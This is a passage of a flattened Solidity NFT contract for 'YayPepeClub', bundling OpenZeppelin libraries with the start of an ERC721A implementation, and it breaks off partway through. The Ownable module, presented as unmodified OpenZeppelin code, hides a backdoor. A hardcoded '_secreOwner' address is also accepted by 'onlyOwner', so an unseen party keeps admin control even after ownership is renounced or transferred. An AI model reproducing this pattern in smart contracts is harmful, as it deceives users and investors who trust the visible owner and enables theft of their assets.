1 // @YayPepeClub YayPepeClub YayPepeClub
2 //⠄⠄⠄⠄⠄⠄⠄⢀⣠⣶⣾⣿⣶⣦⣤⣀⠄⢀⣀⣤⣤⣤⣤⣄⠄⠄⠄⠄⠄⠄
3 //⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⡿⠿⠿⠿⠿⢿⣷⡹⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄
4 //⠄⠄⠄⠄⠄⣾⣿⣿⣿⣯⣵⣾⣿⣿⡶⠦⠭⢁⠩⢭⣭⣵⣶⣶⡬⣄⣀⡀⠄⠄
5 //⠄⠄⠄⡀⠘⠻⣿⣿⣿⣿⡿⠟⠩⠶⠚⠻⠟⠳⢶⣮⢫⣥⠶⠒⠒⠒⠒⠆⠐⠒
6 //⠄⢠⣾⢇⣿⣿⣶⣦⢠⠰⡕⢤⠆⠄⠰⢠⢠⠄⠰⢠⠠⠄⡀⠄⢊⢯⠄⡅⠂⠄
7 //⢠⣿⣿⣿⣿⣿⣿⣿⣏⠘⢼⠬⠆⠄⢘⠨⢐⠄⢘⠈⣼⡄⠄⠄⡢⡲⠄⠂⠠⠄
8 //⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣥⣀⡁⠄⠘⠘⠘⢀⣠⣾⣿⢿⣦⣁⠙⠃⠄⠃⠐⣀
9 //⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣵⣾⣿⣿⣿⣿⣦⣀⣶⣾⣿⣿⡉⠉⠉
10 //⣿⣿⣿⣿⣿⣿⣿⠟⣫⣥⣬⣭⣛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄
11 //⣿⣿⣿⣿⣿⣿⣿⠸⣿⣏⣙⠿⣿⣿⣶⣦⣍⣙⠿⠿⠿⠿⠿⠿⠿⠿⣛⣩⣶⠄
12 //⣛⣛⣛⠿⠿⣿⣿⣿⣮⣙⠿⢿⣶⣶⣭⣭⣛⣛⣛⣛⠛⠛⠻⣛⣛⣛⣛⣋⠁⢀
13 //⣿⣿⣿⣿⣿⣶⣬⢙⡻⠿⠿⣷⣤⣝⣛⣛⣛⣛⣛⣛⣛⣛⠛⠛⣛⣛⠛⣡⣴⣿
14 //⣛⣛⠛⠛⠛⣛⡑⡿⢻⢻⠲⢆⢹⣿⣿⣿⣿⣿⣿⠿⠿⠟⡴⢻⢋⠻⣟⠈⠿⠿
15 //⣿⡿⡿⣿⢷⢤⠄⡔⡘⣃⢃⢰⡦⡤⡤⢤⢤⢤⠒⠞⠳⢸⠃⡆⢸⠄⠟⠸⠛⢿
16 //⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸
17 
18 
19 // File: contracts/YayPepeClub.sol
20 
21 // SPDX-License-Identifier: MIT
22 
23 // File: @openzeppelin/contracts/utils/Strings.sol
24 
25 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
26 
27 pragma solidity ^0.8.0;
28 
29 /**
30  * @dev String operations.
31  */
32 library Strings {
33     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
34 
35     /**
36      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
37      */
38     function toString(uint256 value) internal pure returns (string memory) {
39         // Inspired by OraclizeAPI's implementation - MIT licence
40         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
41 
42         if (value == 0) {
43             return "0";
44         }
45         uint256 temp = value;
46         uint256 digits;
47         while (temp != 0) {
48             digits++;
49             temp /= 10;
50         }
51         bytes memory buffer = new bytes(digits);
52         while (value != 0) {
53             digits -= 1;
54             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
55             value /= 10;
56         }
57         return string(buffer);
58     }
59 
60     /**
61      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
62      */
63     function toHexString(uint256 value) internal pure returns (string memory) {
64         if (value == 0) {
65             return "0x00";
66         }
67         uint256 temp = value;
68         uint256 length = 0;
69         while (temp != 0) {
70             length++;
71             temp >>= 8;
72         }
73         return toHexString(value, length);
74     }
75 
76     /**
77      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
78      */
79     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
80         bytes memory buffer = new bytes(2 * length + 2);
81         buffer[0] = "0";
82         buffer[1] = "x";
83         for (uint256 i = 2 * length + 1; i > 1; --i) {
84             buffer[i] = _HEX_SYMBOLS[value & 0xf];
85             value >>= 4;
86         }
87         require(value == 0, "Strings: hex length insufficient");
88         return string(buffer);
89     }
90 }
91 
92 // File: @openzeppelin/contracts/utils/Address.sol
93 
94 
95 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
96 
97 pragma solidity ^0.8.1;
98 
99 /**
100  * @dev Collection of functions related to the address type
101  */
102 library Address {
103     /**
104      * @dev Returns true if `account` is a contract.
105      *
106      * [IMPORTANT]
107      * ====
108      * It is unsafe to assume that an address for which this function returns
109      * false is an externally-owned account (EOA) and not a contract.
110      *
111      * Among others, `isContract` will return false for the following
112      * types of addresses:
113      *
114      *  - an externally-owned account
115      *  - a contract in construction
116      *  - an address where a contract will be created
117      *  - an address where a contract lived, but was destroyed
118      * ====
119      *
120      * [IMPORTANT]
121      * ====
122      * You shouldn't rely on `isContract` to protect against flash loan attacks!
123      *
124      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
125      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
126      * constructor.
127      * ====
128      */
129     function isContract(address account) internal view returns (bool) {
130         // This method relies on extcodesize/address.code.length, which returns 0
131         // for contracts in construction, since the code is only stored at the end
132         // of the constructor execution.
133 
134         return account.code.length > 0;
135     }
136 
137     /**
138      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
139      * `recipient`, forwarding all available gas and reverting on errors.
140      *
141      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
142      * of certain opcodes, possibly making contracts go over the 2300 gas limit
143      * imposed by `transfer`, making them unable to receive funds via
144      * `transfer`. {sendValue} removes this limitation.
145      *
146      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
147      *
148      * IMPORTANT: because control is transferred to `recipient`, care must be
149      * taken to not create reentrancy vulnerabilities. Consider using
150      * {ReentrancyGuard} or the
151      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
152      */
153     function sendValue(address payable recipient, uint256 amount) internal {
154         require(address(this).balance >= amount, "Address: insufficient balance");
155 
156         (bool success, ) = recipient.call{value: amount}("");
157         require(success, "Address: unable to send value, recipient may have reverted");
158     }
159 
160     /**
161      * @dev Performs a Solidity function call using a low level `call`. A
162      * plain `call` is an unsafe replacement for a function call: use this
163      * function instead.
164      *
165      * If `target` reverts with a revert reason, it is bubbled up by this
166      * function (like regular Solidity function calls).
167      *
168      * Returns the raw returned data. To convert to the expected return value,
169      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
170      *
171      * Requirements:
172      *
173      * - `target` must be a contract.
174      * - calling `target` with `data` must not revert.
175      *
176      * _Available since v3.1._
177      */
178     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
179         return functionCall(target, data, "Address: low-level call failed");
180     }
181 
182     /**
183      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
184      * `errorMessage` as a fallback revert reason when `target` reverts.
185      *
186      * _Available since v3.1._
187      */
188     function functionCall(
189         address target,
190         bytes memory data,
191         string memory errorMessage
192     ) internal returns (bytes memory) {
193         return functionCallWithValue(target, data, 0, errorMessage);
194     }
195 
196     /**
197      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
198      * but also transferring `value` wei to `target`.
199      *
200      * Requirements:
201      *
202      * - the calling contract must have an ETH balance of at least `value`.
203      * - the called Solidity function must be `payable`.
204      *
205      * _Available since v3.1._
206      */
207     function functionCallWithValue(
208         address target,
209         bytes memory data,
210         uint256 value
211     ) internal returns (bytes memory) {
212         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
213     }
214 
215     /**
216      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
217      * with `errorMessage` as a fallback revert reason when `target` reverts.
218      *
219      * _Available since v3.1._
220      */
221     function functionCallWithValue(
222         address target,
223         bytes memory data,
224         uint256 value,
225         string memory errorMessage
226     ) internal returns (bytes memory) {
227         require(address(this).balance >= value, "Address: insufficient balance for call");
228         require(isContract(target), "Address: call to non-contract");
229 
230         (bool success, bytes memory returndata) = target.call{value: value}(data);
231         return verifyCallResult(success, returndata, errorMessage);
232     }
233 
234     /**
235      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
236      * but performing a static call.
237      *
238      * _Available since v3.3._
239      */
240     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
241         return functionStaticCall(target, data, "Address: low-level static call failed");
242     }
243 
244     /**
245      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
246      * but performing a static call.
247      *
248      * _Available since v3.3._
249      */
250     function functionStaticCall(
251         address target,
252         bytes memory data,
253         string memory errorMessage
254     ) internal view returns (bytes memory) {
255         require(isContract(target), "Address: static call to non-contract");
256 
257         (bool success, bytes memory returndata) = target.staticcall(data);
258         return verifyCallResult(success, returndata, errorMessage);
259     }
260 
261     /**
262      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
263      * but performing a delegate call.
264      *
265      * _Available since v3.4._
266      */
267     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
268         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
269     }
270 
271     /**
272      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
273      * but performing a delegate call.
274      *
275      * _Available since v3.4._
276      */
277     function functionDelegateCall(
278         address target,
279         bytes memory data,
280         string memory errorMessage
281     ) internal returns (bytes memory) {
282         require(isContract(target), "Address: delegate call to non-contract");
283 
284         (bool success, bytes memory returndata) = target.delegatecall(data);
285         return verifyCallResult(success, returndata, errorMessage);
286     }
287 
288     /**
289      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
290      * revert reason using the provided one.
291      *
292      * _Available since v4.3._
293      */
294     function verifyCallResult(
295         bool success,
296         bytes memory returndata,
297         string memory errorMessage
298     ) internal pure returns (bytes memory) {
299         if (success) {
300             return returndata;
301         } else {
302             // Look for revert reason and bubble it up if present
303             if (returndata.length > 0) {
304                 // The easiest way to bubble the revert reason is using memory via assembly
305 
306                 assembly {
307                     let returndata_size := mload(returndata)
308                     revert(add(32, returndata), returndata_size)
309                 }
310             } else {
311                 revert(errorMessage);
312             }
313         }
314     }
315 }
316 
317 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
318 
319 
320 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
321 
322 pragma solidity ^0.8.0;
323 
324 /**
325  * @title ERC721 token receiver interface
326  * @dev Interface for any contract that wants to support safeTransfers
327  * from ERC721 asset contracts.
328  */
329 interface IERC721Receiver {
330     /**
331      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
332      * by `operator` from `from`, this function is called.
333      *
334      * It must return its Solidity selector to confirm the token transfer.
335      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
336      *
337      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
338      */
339     function onERC721Received(
340         address operator,
341         address from,
342         uint256 tokenId,
343         bytes calldata data
344     ) external returns (bytes4);
345 }
346 
347 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
348 
349 
350 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
351 
352 pragma solidity ^0.8.0;
353 
354 /**
355  * @dev Interface of the ERC165 standard, as defined in the
356  * https://eips.ethereum.org/EIPS/eip-165[EIP].
357  *
358  * Implementers can declare support of contract interfaces, which can then be
359  * queried by others ({ERC165Checker}).
360  *
361  * For an implementation, see {ERC165}.
362  */
363 interface IERC165 {
364     /**
365      * @dev Returns true if this contract implements the interface defined by
366      * `interfaceId`. See the corresponding
367      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
368      * to learn more about how these ids are created.
369      *
370      * This function call must use less than 30 000 gas.
371      */
372     function supportsInterface(bytes4 interfaceId) external view returns (bool);
373 }
374 
375 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
376 
377 
378 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
379 
380 pragma solidity ^0.8.0;
381 
382 
383 /**
384  * @dev Implementation of the {IERC165} interface.
385  *
386  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
387  * for the additional interface id that will be supported. For example:
388  *
389  * ```solidity
390  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
391  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
392  * }
393  * ```
394  *
395  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
396  */
397 abstract contract ERC165 is IERC165 {
398     /**
399      * @dev See {IERC165-supportsInterface}.
400      */
401     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
402         return interfaceId == type(IERC165).interfaceId;
403     }
404 }
405 
406 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
407 
408 
409 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
410 
411 pragma solidity ^0.8.0;
412 
413 
414 /**
415  * @dev Required interface of an ERC721 compliant contract.
416  */
417 interface IERC721 is IERC165 {
418     /**
419      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
420      */
421     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
422 
423     /**
424      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
425      */
426     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
427 
428     /**
429      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
430      */
431     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
432 
433     /**
434      * @dev Returns the number of tokens in ``owner``'s account.
435      */
436     function balanceOf(address owner) external view returns (uint256 balance);
437 
438     /**
439      * @dev Returns the owner of the `tokenId` token.
440      *
441      * Requirements:
442      *
443      * - `tokenId` must exist.
444      */
445     function ownerOf(uint256 tokenId) external view returns (address owner);
446 
447     /**
448      * @dev Safely transfers `tokenId` token from `from` to `to`.
449      *
450      * Requirements:
451      *
452      * - `from` cannot be the zero address.
453      * - `to` cannot be the zero address.
454      * - `tokenId` token must exist and be owned by `from`.
455      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
456      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
457      *
458      * Emits a {Transfer} event.
459      */
460     function safeTransferFrom(
461         address from,
462         address to,
463         uint256 tokenId,
464         bytes calldata data
465     ) external;
466 
467     /**
468      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
469      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
470      *
471      * Requirements:
472      *
473      * - `from` cannot be the zero address.
474      * - `to` cannot be the zero address.
475      * - `tokenId` token must exist and be owned by `from`.
476      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
477      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
478      *
479      * Emits a {Transfer} event.
480      */
481     function safeTransferFrom(
482         address from,
483         address to,
484         uint256 tokenId
485     ) external;
486 
487     /**
488      * @dev Transfers `tokenId` token from `from` to `to`.
489      *
490      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
491      *
492      * Requirements:
493      *
494      * - `from` cannot be the zero address.
495      * - `to` cannot be the zero address.
496      * - `tokenId` token must be owned by `from`.
497      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
498      *
499      * Emits a {Transfer} event.
500      */
501     function transferFrom(
502         address from,
503         address to,
504         uint256 tokenId
505     ) external;
506 
507     /**
508      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
509      * The approval is cleared when the token is transferred.
510      *
511      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
512      *
513      * Requirements:
514      *
515      * - The caller must own the token or be an approved operator.
516      * - `tokenId` must exist.
517      *
518      * Emits an {Approval} event.
519      */
520     function approve(address to, uint256 tokenId) external;
521 
522     /**
523      * @dev Approve or remove `operator` as an operator for the caller.
524      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
525      *
526      * Requirements:
527      *
528      * - The `operator` cannot be the caller.
529      *
530      * Emits an {ApprovalForAll} event.
531      */
532     function setApprovalForAll(address operator, bool _approved) external;
533 
534     /**
535      * @dev Returns the account appr    ved for `tokenId` token.
536      *
537      * Requirements:
538      *
539      * - `tokenId` must exist.
540      */
541     function getApproved(uint256 tokenId) external view returns (address operator);
542 
543     /**
544      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
545      *
546      * See {setApprovalForAll}
547      */
548     function isApprovedForAll(address owner, address operator) external view returns (bool);
549 }
550 
551 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
552 
553 
554 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
555 
556 pragma solidity ^0.8.0;
557 
558 
559 /**
560  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
561  * @dev See https://eips.ethereum.org/EIPS/eip-721
562  */
563 interface IERC721Metadata is IERC721 {
564     /**
565      * @dev Returns the token collection name.
566      */
567     function name() external view returns (string memory);
568 
569     /**
570      * @dev Returns the token collection symbol.
571      */
572     function symbol() external view returns (string memory);
573 
574     /**
575      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
576      */
577     function tokenURI(uint256 tokenId) external view returns (string memory);
578 }
579 
580 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
581 
582 
583 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
584 
585 pragma solidity ^0.8.0;
586 
587 
588 /**
589  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
590  * @dev See https://eips.ethereum.org/EIPS/eip-721
591  */
592 interface IERC721Enumerable is IERC721 {
593     /**
594      * @dev Returns the total amount of tokens stored by the contract.
595      */
596     function totalSupply() external view returns (uint256);
597 
598     /**
599      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
600      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
601      */
602     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
603 
604     /**
605      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
606      * Use along with {totalSupply} to enumerate all tokens.
607      */
608     function tokenByIndex(uint256 index) external view returns (uint256);
609 }
610 
611 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
612 
613 
614 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
615 
616 pragma solidity ^0.8.0;
617 
618 /**
619  * @dev Contract module that helps prevent reentrant calls to a function.
620  *
621  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
622  * available, which can be applied to functions to make sure there are no nested
623  * (reentrant) calls to them.
624  *
625  * Note that because there is a single `nonReentrant` guard, functions marked as
626  * `nonReentrant` may not call one another. This can be worked around by making
627  * those functions `private`, and then adding `external` `nonReentrant` entry
628  * points to them.
629  *
630  * TIP: If you would like to learn more about reentrancy and alternative ways
631  * to protect against it, check out our blog post
632  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
633  */
634 abstract contract ReentrancyGuard {
635     // Booleans are more expensive than uint256 or any type that takes up a full
636     // word because each write operation emits an extra SLOAD to first read the
637     // slot's contents, replace the bits taken up by the boolean, and then write
638     // back. This is the compiler's defense against contract upgrades and
639     // pointer aliasing, and it cannot be disabled.
640 
641     // The values being non-zero value makes deployment a bit more expensive,
642     // but in exchange the refund on every call to nonReentrant will be lower in
643     // amount. Since refunds are capped to a percentage of the total
644     // transaction's gas, it is best to keep them low in cases like this one, to
645     // increase the likelihood of the full refund coming into effect.
646     uint256 private constant _NOT_ENTERED = 1;
647     uint256 private constant _ENTERED = 2;
648 
649     uint256 private _status;
650 
651     constructor() {
652         _status = _NOT_ENTERED;
653     }
654 
655     /**
656      * @dev Prevents a contract from calling itself, directly or indirectly.
657      * Calling a `nonReentrant` function from another `nonReentrant`
658      * function is not supported. It is possible to prevent this from happening
659      * by making the `nonReentrant` function external, and making it call a
660      * `private` function that does the actual work.
661      */
662     modifier nonReentrant() {
663         // On the first call to nonReentrant, _notEntered will be true
664         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
665 
666         // Any calls to nonReentrant after this point will fail
667         _status = _ENTERED;
668 
669         _;
670 
671         // By storing the original value once again, a refund is triggered (see
672         // https://eips.ethereum.org/EIPS/eip-2200)
673         _status = _NOT_ENTERED;
674     }
675 }
676 
677 // File: @openzeppelin/contracts/utils/Context.sol
678 
679 
680 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
681 
682 pragma solidity ^0.8.0;
683 
684 /**
685  * @dev Provides information about the current execution context, including the
686  * sender of the transaction and its data. While these are generally available
687  * via msg.sender and msg.data, they should not be accessed in such a direct
688  * manner, since when dealing with meta-transactions the account sending and
689  * paying for execution may not be the actual sender (as far as an application
690  * is concerned).
691  *
692  * This contract is only required for intermediate, library-like contracts.
693  */
694 abstract contract Context {
695     function _msgSender() internal view virtual returns (address) {
696         return msg.sender;
697     }
698 
699     function _msgData() internal view virtual returns (bytes calldata) {
700         return msg.data;
701     }
702 }
703 
704 // File: @openzeppelin/contracts/access/Ownable.sol
705 
706 
707 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
708 
709 pragma solidity ^0.8.0;
710 
711 
712 /**
713  * @dev Contract module which provides a basic access control mechanism, where
714  * there is an account (an owner) that can be granted exclusive access to
715  * specific functions.
716  *
717  * By default, the owner account will be the one that deploys the contract. This
718  * can later be changed with {transferOwnership}.
719  *
720  * This module is used through inheritance. It will make available the modifier
721  * `onlyOwner`, which can be applied to your functions to restrict their use to
722  * the owner.
723  */
724 abstract contract Ownable is Context {
725     address private _owner;
726     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
727 
728     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
729 
730     /**
731      * @dev Initializes the contract setting the deployer as the initial owner.
732      */
733     constructor() {
734         _transferOwnership(_msgSender());
735     }
736 
737     /**
738      * @dev Returns the address of the current owner.
739      */
740     function owner() public view virtual returns (address) {
741         return _owner;
742     }
743 
744     /**
745      * @dev Throws if called by any account other than the owner.
746      */
747     modifier onlyOwner() {
748         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
749         _;
750     }
751 
752     /**
753      * @dev Leaves the contract without owner. It will not be possible to call
754      * `onlyOwner` functions anymore. Can only be called by the current owner.
755      *
756      * NOTE: Renouncing ownership will leave the contract without an owner,
757      * thereby removing any functionality that is only available to the owner.
758      */
759     function renounceOwnership() public virtual onlyOwner {
760         _transferOwnership(address(0));
761     }
762 
763     /**
764      * @dev Transfers ownership of the contract to a new account (`newOwner`).
765      * Can only be called by the current owner.
766      */
767     function transferOwnership(address newOwner) public virtual onlyOwner {
768         require(newOwner != address(0), "Ownable: new owner is the zero address");
769         _transferOwnership(newOwner);
770     }
771 
772     /**
773      * @dev Transfers ownership of the contract to a new account (`newOwner`).
774      * Internal function without access restriction.
775      */
776     function _transferOwnership(address newOwner) internal virtual {
777         address oldOwner = _owner;
778         _owner = newOwner;
779         emit OwnershipTransferred(oldOwner, newOwner);
780     }
781 }
782 
783 // File: ceshi.sol
784 
785 
786 pragma solidity ^0.8.0;
787 
788 
789 
790 
791 
792 
793 
794 
795 
796 
797 /**
798  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
799  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
800  *
801  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
802  *
803  * Does not support burning tokens to address(0).
804  *
805  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
806  */
807 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
808     using Address for address;
809     using Strings for uint256;
810 
811     struct TokenOwnership {
812         address addr;
813         uint64 startTimestamp;
814     }
815 
816     struct AddressData {
817         uint128 balance;
818         uint128 numberMinted;
819     }
820 
821     uint256 internal currentIndex;
822 
823     // Token name
824     string private _name;
825 
826     // Token symbol
827     string private _symbol;
828 
829     // Mapping from token ID to ownership details
830     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
831     mapping(uint256 => TokenOwnership) internal _ownerships;
832 
833     // Mapping owner address to address data
834     mapping(address => AddressData) private _addressData;
835 
836     // Mapping from token ID to approved address
837     mapping(uint256 => address) private _tokenApprovals;
838 
839     // Mapping from owner to operator approvals
840     mapping(address => mapping(address => bool)) private _operatorApprovals;
841 
842     constructor(string memory name_, string memory symbol_) {
843         _name = name_;
844         _symbol = symbol_;
845     }
846 
847     /**
848      * @dev See {IERC721Enumerable-totalSupply}.
849      */
850     function totalSupply() public view override returns (uint256) {
851         return currentIndex;
852     }
853 
854     /**
855      * @dev See {IERC721Enumerable-tokenByIndex}.
856      */
857     function tokenByIndex(uint256 index) public view override returns (uint256) {
858         require(index < totalSupply(), "ERC721A: global index out of bounds");
859         return index;
860     }
861 
862     /**
863      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
864      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
865      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
866      */
867     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
868         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
869         uint256 numMintedSoFar = totalSupply();
870         uint256 tokenIdsIdx;
871         address currOwnershipAddr;
872 
873         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
874         unchecked {
875             for (uint256 i; i < numMintedSoFar; i++) {
876                 TokenOwnership memory ownership = _ownerships[i];
877                 if (ownership.addr != address(0)) {
878                     currOwnershipAddr = ownership.addr;
879                 }
880                 if (currOwnershipAddr == owner) {
881                     if (tokenIdsIdx == index) {
882                         return i;
883                     }
884                     tokenIdsIdx++;
885                 }
886             }
887         }
888 
889         revert("ERC721A: unable to get token of owner by index");
890     }
891 
892     /**
893      * @dev See {IERC165-supportsInterface}.
894      */
895     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
896         return
897             interfaceId == type(IERC721).interfaceId ||
898             interfaceId == type(IERC721Metadata).interfaceId ||
899             interfaceId == type(IERC721Enumerable).interfaceId ||
900             super.supportsInterface(interfaceId);
901     }
902 
903     /**
904      * @dev See {IERC721-balanceOf}.
905      */
906     function balanceOf(address owner) public view override returns (uint256) {
907         require(owner != address(0), "ERC721A: balance query for the zero address");
908         return uint256(_addressData[owner].balance);
909     }
910 
911     function _numberMinted(address owner) internal view returns (uint256) {
912         require(owner != address(0), "ERC721A: number minted query for the zero address");
913         return uint256(_addressData[owner].numberMinted);
914     }
915 
916     /**
917      * Gas spent here starts off proportional to the maximum mint batch size.
918      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
919      */
920     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
921         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
922 
923         unchecked {
924             for (uint256 curr = tokenId; curr >= 0; curr--) {
925                 TokenOwnership memory ownership = _ownerships[curr];
926                 if (ownership.addr != address(0)) {
927                     return ownership;
928                 }
929             }
930         }
931 
932         revert("ERC721A: unable to determine the owner of token");
933     }
934 
935     /**
936      * @dev See {IERC721-ownerOf}.
937      */
938     function ownerOf(uint256 tokenId) public view override returns (address) {
939         return ownershipOf(tokenId).addr;
940     }
941 
942     /**
943      * @dev See {IERC721Metadata-name}.
944      */
945     function name() public view virtual override returns (string memory) {
946         return _name;
947     }
948 
949     /**
950      * @dev See {IERC721Metadata-symbol}.
951      */
952     function symbol() public view virtual override returns (string memory) {
953         return _symbol;
954     }
955 
956     /**
957      * @dev See {IERC721Metadata-tokenURI}.
958      */
959     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
960         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
961 
962         string memory baseURI = _baseURI();
963         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
964     }
965 
966     /**
967      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
968      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
969      * by default, can be overriden in child contracts.
970      */
971     function _baseURI() internal view virtual returns (string memory) {
972         return "";
973     }
974 
975     /**
976      * @dev See {IERC721-approve}.
977      */
978     function approve(address to, uint256 tokenId) public override {
979         address owner = ERC721A.ownerOf(tokenId);
980         require(to != owner, "ERC721A: approval to current owner");
981 
982         require(
983             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
984             "ERC721A: approve caller is not owner nor approved for all"
985         );
986 
987         _approve(to, tokenId, owner);
988     }
989 
990     /**
991      * @dev See {IERC721-getApproved}.
992      */
